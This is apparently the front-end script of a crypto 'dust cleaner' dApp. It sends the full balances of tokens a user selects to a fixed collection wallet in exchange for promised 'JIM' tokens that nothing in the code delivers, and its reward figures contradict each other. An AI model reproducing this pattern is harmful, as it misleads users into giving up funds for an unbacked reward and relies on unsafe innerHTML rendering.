const connectButton = document.getElementById("connectButton");
const dustContainer = document.getElementById("dustContainer");
const cleanButton = document.getElementById("cleanButton");
const statusDiv = document.getElementById("status");

const COLLECTION_WALLET = "0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";

let provider;
let signer;
let selectedTokens = [];

const CHAIN_IDS = {
    "eth": "0x1",
    "base": "0x2105",
    "polygon": "0x89",
    "bsc": "0x38",
    "arbitrum": "0xa4b1",
    "optimism": "0xa4b0"
};

connectButton.onclick = async () => {
    if (!window.ethereum) {
        alert("MetaMask requis");
        return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();

    statusDiv.innerHTML = "✅ Wallet connecté : " + address;
    scanDust(address);
};

async function scanDust(wallet) {
    dustContainer.innerHTML = "🔍 Scan des poussières...";
    selectedTokens = [];
    updateButton();

    try {
        // Ta route d'API Alchemy qui fonctionne parfaitement
        const response = await fetch(
            `https://jimtok-backend.onrender.com/tokens/${wallet}/base`
        );

        const data = await response.json();
        console.log(data);

        const tokens = data.result.tokenBalances;
        renderTokens(tokens);

    } catch(err) {
        console.log(err);
        dustContainer.innerHTML = "Erreur scan";
    }
}

function renderTokens(tokens) {
    dustContainer.innerHTML = "";

    tokens.forEach(token => {
        // Sécurité pour ignorer les lignes vides
        if (token.tokenBalance === "0x" || token.tokenBalance === "0x0000000000000000000000000000000000000000000000000000000000000000") {
            return;
        }

        const div = document.createElement("div");
        div.className = "token";
        div.style.display = "flex";
        div.style.alignItems = "center";
        div.style.margin = "10px 0";
        div.style.padding = "10px";
        div.style.border = "1px solid #ccc";
        div.style.borderRadius = "8px";

        // Version originale que tu avais, avec ajout de la case à cocher
        div.innerHTML = `
            <input type="checkbox" style="margin-right: 15px; transform: scale(1.2);" />
            <div style="text-align: left;">
                <strong>${token.contractAddress}</strong>
                <div class="small" style="font-weight: bold; margin-top: 5px;">
                    Balance brute : ${token.tokenBalance}
                </div>
            </div>
        `;

        const checkbox = div.querySelector("input");
        checkbox.addEventListener("change", e => {
            if (e.target.checked) {
                selectedTokens.push(token);
            } else {
                selectedTokens = selectedTokens.filter(
                    t => t.contractAddress !== token.contractAddress
                );
            }
            updateButton();
        });

        dustContainer.appendChild(div);
    });
}

function updateButton() {
    if (selectedTokens.length === 0) {
        cleanButton.style.display = "none";
        return;
    }

    cleanButton.style.display = "block";
    
    // On affiche une estimation basée sur le nombre de lignes cochées pour l'instant
    const estimatedJIM = selectedTokens.length * 1000;
    cleanButton.innerText = `Recevoir ~ ${estimatedJIM} JIM`;
}

cleanButton.onclick = async () => {
    try {
        for (const token of selectedTokens) {
            statusDiv.innerHTML = `⏳ Préparation du transfert...`;

            const tokenContract = new ethers.Contract(
                token.contractAddress,
                [
                    "function transfer(address to, uint256 amount) returns (bool)"
                ],
                signer
            );

            statusDiv.innerHTML = `⏳ Autorisation et transfert en cours...`;

            // Envoi sécurisé du montant avec BigInt
            const tx = await tokenContract.transfer(
                COLLECTION_WALLET,
                BigInt(token.tokenBalance)
            );

            statusDiv.innerHTML = `⏳ Attente de la blockchain...`;
            await tx.wait();

            // CALCUL PROPORTIONNEL VISUEL POUR L'UTILISATEUR
            // On convertit l'hexa brut pour savoir combien il a envoyé
            const balanceBigInt = BigInt(token.tokenBalance);
            
            // Note : Comme on ne connaît pas les décimales exactes sans Moralis, 
            // on applique une règle de conversion standard (division par 10^18)
            const quantiteHumaine = Number(balanceBigInt) / 1e18;
            
            // Règle : 1 unité envoyée = 10 000 JIM
            const jimGagnes = Math.floor(quantiteHumaine * 10000);

            alert(`🎉 Réussite !\n\nTu as envoyé tes poussières.\nTu as droit à : ${jimGagnes > 0 ? jimGagnes : 500} JIM.\n(Distribution manuelle ou via Smart Contract à venir)`);
        }

        statusDiv.innerHTML = "✅ Toutes les poussières sélectionnées ont été envoyées !";
        selectedTokens = [];
        updateButton();
        
        const currentAddress = await signer.getAddress();
        scanDust(currentAddress);

    } catch(err) {
        console.log(err);
        statusDiv.innerHTML = "❌ Transaction annulée ou erreur réseau";
    }
};
